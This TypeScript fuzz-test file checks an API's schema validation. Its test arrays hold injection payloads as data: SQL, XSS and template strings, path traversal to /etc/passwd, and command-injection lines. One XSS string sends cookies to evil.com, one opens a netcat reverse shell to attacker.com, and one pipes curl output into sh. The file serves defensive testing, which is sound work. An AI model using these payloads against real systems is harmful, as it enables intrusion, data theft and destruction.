/**
 * Fuzz Testing: API Input Validation
 * 
 * Tests API endpoint input validation with malicious and edge-case inputs
 * to discover injection vulnerabilities and parsing bugs.
 * 
 * Issue: #55 - Security Fuzz Testing for Protocol Handlers
 */

import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import * as fc from 'fast-check';
import express from 'express';
import { Server } from 'http';
import {
  insertSiteSchema,
  insertAssetSchema,
  insertEventAnchorSchema,
  insertMaintenanceRecordSchema,
} from '@shared/schema';
import { z } from 'zod';
import { fromZodError } from 'zod-validation-error';

// =============================================================================
// SCHEMA VALIDATION FUZZ TESTS
// =============================================================================

describe('Fuzz: Site Schema Validation', () => {
  // Test: Valid inputs should pass
  it('should accept valid site data', () => {
    fc.assert(
      fc.property(
        fc.record({
          name: fc.string({ minLength: 1, maxLength: 255 }),
          location: fc.string({ minLength: 1, maxLength: 500 }),
          owner: fc.hexaString({ minLength: 40, maxLength: 40 }).map(h => '0x' + h),
        }),
        (data) => {
          const result = insertSiteSchema.safeParse(data);
          // We're testing that the schema doesn't crash on valid-looking data
          expect(result.success === true || result.success === false).toBe(true);
        }
      ),
      { numRuns: 100 }
    );
  });

  // Test: Malformed inputs should be rejected safely
  it('should safely reject malformed site data', () => {
    fc.assert(
      fc.property(
        fc.oneof(
          fc.constant(null),
          fc.constant(undefined),
          fc.integer(),
          fc.boolean(),
          fc.array(fc.anything()),
          fc.string(),
        ),
        (malformed) => {
          // Should not throw, just return failure
          const result = insertSiteSchema.safeParse(malformed);
          expect(result.success === true || result.success === false).toBe(true);
        }
      ),
      { numRuns: 50 }
    );
  });

  // Test: SQL injection attempts should be handled
  it('should handle SQL injection attempts in string fields', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE sites; --",
      "1' OR '1'='1",
      "1; SELECT * FROM users",
      "admin'--",
      "' UNION SELECT * FROM users--",
      "1' AND SLEEP(5)--",
      "1'; EXEC xp_cmdshell('dir')--",
      "' OR 1=1 --",
      "'; TRUNCATE TABLE events; --",
      "1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
    ];

    for (const payload of sqlInjectionPayloads) {
      const data = {
        name: payload,
        location: payload,
        owner: '0x' + '1'.repeat(40),
      };
      
      // Schema should either accept (if validation passes) or reject cleanly
      const result = insertSiteSchema.safeParse(data);
      expect(() => insertSiteSchema.safeParse(data)).not.toThrow();
    }
  });

  // Test: XSS attempts should be handled
  it('should handle XSS attempts in string fields', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '"><img src=x onerror=alert(1)>',
      "javascript:alert('XSS')",
      '<svg onload=alert(1)>',
      '{{constructor.constructor("alert(1)")()}}',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    ];

    for (const payload of xssPayloads) {
      const data = {
        name: payload,
        location: payload,
        owner: '0x' + '1'.repeat(40),
      };
      
      // Should handle without throwing
      expect(() => insertSiteSchema.safeParse(data)).not.toThrow();
    }
  });

  // Test: Oversized inputs
  it('should handle oversized inputs', () => {
    fc.assert(
      fc.property(
        fc.string({ minLength: 10000, maxLength: 100000 }),
        (oversizedString) => {
          const data = {
            name: oversizedString,
            location: oversizedString,
            owner: '0x' + '1'.repeat(40),
          };
          
          // Should not crash or hang
          const start = Date.now();
          const result = insertSiteSchema.safeParse(data);
          const duration = Date.now() - start;
          
          // Should complete within reasonable time (5 seconds)
          expect(duration).toBeLessThan(5000);
        }
      ),
      { numRuns: 10 }
    );
  });
});

// =============================================================================
// EVENT SCHEMA FUZZ TESTS
// =============================================================================

describe('Fuzz: Event Anchor Schema Validation', () => {
  // Test: Valid event data
  it('should accept valid event anchor data', () => {
    fc.assert(
      fc.property(
        fc.record({
          assetId: fc.uuid(),
          eventType: fc.constantFrom('SENSOR_READING', 'ALARM', 'SETPOINT_CHANGE', 'STATE_CHANGE'),
          payloadHash: fc.hexaString({ minLength: 64, maxLength: 64 }).map(h => '0x' + h),
          timestamp: fc.date(),
          recordedBy: fc.hexaString({ minLength: 40, maxLength: 40 }).map(h => '0x' + h),
          txHash: fc.option(fc.hexaString({ minLength: 64, maxLength: 64 }).map(h => '0x' + h), { nil: null }),
          details: fc.option(fc.string({ maxLength: 1000 }), { nil: '' }),
        }),
        (data) => {
          // Test schema doesn't crash
          const result = insertEventAnchorSchema.safeParse(data);
          expect(result.success === true || result.success === false).toBe(true);
        }
      ),
      { numRuns: 100 }
    );
  });

  // Test: Malicious payload in details field
  it('should handle malicious payloads in details field', () => {
    const maliciousPayloads = [
      '${7*7}', // Template injection
      '{{7*7}}', // Template injection
      '#{7*7}', // Ruby template injection
      '<%= 7*7 %>', // ERB injection
      '${T(java.lang.Runtime).getRuntime().exec("whoami")}', // Java EL injection
      '__proto__', // Prototype pollution
      'constructor', // Prototype pollution
      '__defineGetter__', // Prototype pollution
      '{"$gt": ""}', // NoSQL injection
      '{"$where": "function() { return true; }"}', // NoSQL injection
    ];

    for (const payload of maliciousPayloads) {
      const data = {
        assetId: 'test-asset-id',
        eventType: 'SENSOR_READING',
        payloadHash: '0x' + '1'.repeat(64),
        timestamp: new Date(),
        recordedBy: '0x' + '1'.repeat(40),
        details: payload,
      };

      expect(() => insertEventAnchorSchema.safeParse(data)).not.toThrow();
    }
  });

  // Test: Invalid timestamp formats
  it('should handle invalid timestamp formats', () => {
    const invalidTimestamps = [
      'not-a-date',
      '9999-99-99',
      '-1-1-1',
      '2024-13-45', // Invalid month/day
      '2024-02-30', // Invalid day for February
      Infinity,
      -Infinity,
      NaN,
      '', // Empty string
      null,
      undefined,
    ];

    for (const timestamp of invalidTimestamps) {
      const data = {
        assetId: 'test-asset-id',
        eventType: 'SENSOR_READING',
        payloadHash: '0x' + '1'.repeat(64),
        timestamp: timestamp as any,
        recordedBy: '0x' + '1'.repeat(40),
      };

      expect(() => insertEventAnchorSchema.safeParse(data)).not.toThrow();
    }
  });

  // Test: Unicode normalization attacks
  it('should handle unicode normalization attacks', () => {
    const unicodeAttacks = [
      '\u0000', // Null byte
      '\u200B', // Zero-width space
      '\u200C', // Zero-width non-joiner
      '\u200D', // Zero-width joiner
      '\uFEFF', // BOM
      '\u202E', // Right-to-left override
      'admin\u0000\u0000', // Null byte injection
      'test\x00hidden', // Embedded null
      '\uD800', // Unpaired surrogate
      '\uDFFF', // Unpaired surrogate
    ];

    for (const attack of unicodeAttacks) {
      const data = {
        assetId: attack,
        eventType: 'SENSOR_READING',
        payloadHash: '0x' + '1'.repeat(64),
        timestamp: new Date(),
        recordedBy: '0x' + '1'.repeat(40),
        details: attack,
      };

      expect(() => insertEventAnchorSchema.safeParse(data)).not.toThrow();
    }
  });
});

// =============================================================================
// BATCH ANCHORING INPUT FUZZ TESTS
// =============================================================================

describe('Fuzz: Batch Anchoring Input Validation', () => {
  // Test: Batch configuration bounds
  it('should handle extreme batch configuration values', () => {
    const extremeConfigs = [
      { maxBatchSize: 0, maxBatchAgeMs: 0, enabled: true },
      { maxBatchSize: -1, maxBatchAgeMs: -1, enabled: true },
      { maxBatchSize: Number.MAX_SAFE_INTEGER, maxBatchAgeMs: Number.MAX_SAFE_INTEGER, enabled: true },
      { maxBatchSize: Number.MIN_SAFE_INTEGER, maxBatchAgeMs: Number.MIN_SAFE_INTEGER, enabled: false },
      { maxBatchSize: Infinity, maxBatchAgeMs: Infinity, enabled: true },
      { maxBatchSize: NaN, maxBatchAgeMs: NaN, enabled: false },
      { maxBatchSize: 0.5, maxBatchAgeMs: 0.5, enabled: true }, // Fractional
    ];

    for (const config of extremeConfigs) {
      // Just verify these don't cause crashes when validated
      expect(() => {
        const validated = z.object({
          maxBatchSize: z.number().optional(),
          maxBatchAgeMs: z.number().optional(),
          enabled: z.boolean().optional(),
        }).safeParse(config);
      }).not.toThrow();
    }
  });

  // Test: Event queue with malformed events
  it('should handle malformed events in queue', () => {
    fc.assert(
      fc.property(
        fc.array(
          fc.oneof(
            // Valid-ish event
            fc.record({
              id: fc.uuid(),
              assetId: fc.uuid(),
              eventType: fc.string(),
              payload: fc.jsonValue(),
              timestamp: fc.date(),
            }),
            // Malformed events
            fc.constant(null),
            fc.constant(undefined),
            fc.integer(),
            fc.string(),
            fc.record({ randomField: fc.anything() }),
          ),
          { minLength: 0, maxLength: 50 }
        ),
        (events) => {
          // Simulating what batch service might receive
          // This tests that processing doesn't crash
          const filtered = events.filter(e => 
            e !== null && 
            e !== undefined && 
            typeof e === 'object' &&
            'id' in e &&
            'assetId' in e &&
            'eventType' in e
          );
          
          expect(Array.isArray(filtered)).toBe(true);
        }
      ),
      { numRuns: 50 }
    );
  });
});

// =============================================================================
// PAGINATION INPUT FUZZ TESTS
// =============================================================================

describe('Fuzz: Pagination Input Validation', () => {
  // Test: Page and limit parameters
  it('should handle extreme pagination values', () => {
    const extremeValues = [
      { page: 0, limit: 0 },
      { page: -1, limit: -1 },
      { page: 1.5, limit: 2.5 },
      { page: Number.MAX_SAFE_INTEGER, limit: Number.MAX_SAFE_INTEGER },
      { page: Infinity, limit: Infinity },
      { page: NaN, limit: NaN },
      { page: '1', limit: '50' }, // String numbers
      { page: 'abc', limit: 'xyz' }, // Invalid strings
      { page: null, limit: null },
      { page: undefined, limit: undefined },
      { page: [], limit: [] }, // Arrays
      { page: {}, limit: {} }, // Objects
    ];

    for (const params of extremeValues) {
      // Simulate query parameter parsing
      const parsedPage = typeof params.page === 'string' 
        ? parseInt(params.page, 10) 
        : params.page;
      const parsedLimit = typeof params.limit === 'string' 
        ? parseInt(params.limit, 10) 
        : params.limit;
      
      // Validate page
      const page = Number.isFinite(parsedPage) && parsedPage > 0 ? parsedPage : 1;
      // Validate limit (between 1 and 100)
      const limit = Number.isFinite(parsedLimit) && parsedLimit > 0 
        ? Math.min(parsedLimit, 100) 
        : 50;
      
      expect(page).toBeGreaterThan(0);
      expect(limit).toBeGreaterThan(0);
      expect(limit).toBeLessThanOrEqual(100);
    }
  });
});

// =============================================================================
// JSON PAYLOAD FUZZ TESTS
// =============================================================================

describe('Fuzz: JSON Payload Processing', () => {
  // Test: Deeply nested JSON
  it('should handle deeply nested JSON objects', () => {
    // Create deeply nested object
    const createDeepObject = (depth: number): any => {
      if (depth === 0) return 'leaf';
      return { nested: createDeepObject(depth - 1) };
    };

    const depths = [10, 50, 100, 500];
    
    for (const depth of depths) {
      const deepObj = createDeepObject(depth);
      
      const start = Date.now();
      expect(() => JSON.stringify(deepObj)).not.toThrow();
      const duration = Date.now() - start;
      
      // Should complete in reasonable time
      expect(duration).toBeLessThan(5000);
    }
  });

  // Test: Large arrays
  it('should handle large arrays in payloads', () => {
    fc.assert(
      fc.property(
        fc.integer({ min: 100, max: 10000 }),
        (size) => {
          const largeArray = new Array(size).fill(null).map((_, i) => ({
            index: i,
            value: `item-${i}`,
          }));

          const start = Date.now();
          const serialized = JSON.stringify(largeArray);
          const parsed = JSON.parse(serialized);
          const duration = Date.now() - start;

          expect(parsed.length).toBe(size);
          expect(duration).toBeLessThan(5000);
        }
      ),
      { numRuns: 10 }
    );
  });

  // Test: JSON with special number values
  it('should handle special number values in JSON', () => {
    // Note: These are technically invalid JSON but JavaScript handles them
    const specialNumbers = [
      Number.MAX_VALUE,
      Number.MIN_VALUE,
      Number.EPSILON,
      Number.MAX_SAFE_INTEGER,
      Number.MIN_SAFE_INTEGER,
      0,
      -0,
      1e308,
      1e-308,
    ];

    for (const num of specialNumbers) {
      const obj = { value: num };
      const serialized = JSON.stringify(obj);
      const parsed = JSON.parse(serialized);
      
      // 0 and -0 are equal in JavaScript
      if (Object.is(num, -0)) {
        expect(parsed.value).toBe(0);
      } else {
        expect(parsed.value).toBe(num);
      }
    }
  });

  // Test: Circular reference detection
  it('should reject circular references', () => {
    const obj: any = { a: 1 };
    obj.self = obj;

    expect(() => JSON.stringify(obj)).toThrow();
  });
});

// =============================================================================
// PATH TRAVERSAL TESTS
// =============================================================================

describe('Fuzz: Path Traversal Prevention', () => {
  const pathTraversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd', // Double-encoded
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....\\....\\....\\windows\\system32',
    '..;/..;/..;/etc/passwd',
    '/etc/passwd%00.txt', // Null byte
    '..\\..\\..\\..\\..\\..\\etc\\passwd',
  ];

  it('should detect and handle path traversal attempts', () => {
    for (const payload of pathTraversalPayloads) {
      // Simple path traversal detection
      const hasTraversal = payload.includes('..') || 
                          payload.includes('%2e%2e') ||
                          payload.includes('%252e');
      
      expect(hasTraversal).toBe(true);
    }
  });
});

// =============================================================================
// ETHEREUM ADDRESS VALIDATION FUZZ
// =============================================================================

describe('Fuzz: Ethereum Address Validation', () => {
  // Test: Valid addresses
  it('should accept valid Ethereum addresses', () => {
    fc.assert(
      fc.property(
        fc.hexaString({ minLength: 40, maxLength: 40 }),
        (hex) => {
          const address = '0x' + hex;
          const isValid = /^0x[a-fA-F0-9]{40}$/.test(address);
          expect(isValid).toBe(true);
        }
      ),
      { numRuns: 100 }
    );
  });

  // Test: Invalid addresses
  it('should reject invalid Ethereum addresses', () => {
    const invalidAddresses = [
      '0x', // Too short
      '0x123', // Too short
      '0x' + '1'.repeat(39), // One character short
      '0x' + '1'.repeat(41), // One character long
      '1'.repeat(40), // Missing 0x prefix
      '0X' + '1'.repeat(40), // Wrong case prefix (might be valid depending on implementation)
      '0x' + 'g'.repeat(40), // Invalid hex character
      '0x' + 'G'.repeat(40), // Invalid hex character
      '', // Empty
      null,
      undefined,
      12345, // Number
    ];

    for (const addr of invalidAddresses) {
      const isValid = typeof addr === 'string' && /^0x[a-fA-F0-9]{40}$/.test(addr);
      expect(isValid).toBe(false);
    }
  });
});

// =============================================================================
// COMMAND INJECTION PREVENTION
// =============================================================================

describe('Fuzz: Command Injection Prevention', () => {
  const commandInjectionPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(whoami)',
    '& net user',
    '\n/bin/sh',
    '|| ping -c 10 127.0.0.1',
    '; rm -rf /',
    '| nc -e /bin/sh attacker.com 4444',
    '$(curl http://evil.com/shell.sh | sh)',
  ];

  it('should identify command injection patterns', () => {
    const dangerousPatterns = /[;&|`$()\\]/;
    
    for (const payload of commandInjectionPayloads) {
      const hasDangerousChars = dangerousPatterns.test(payload);
      expect(hasDangerousChars).toBe(true);
    }
  });
});
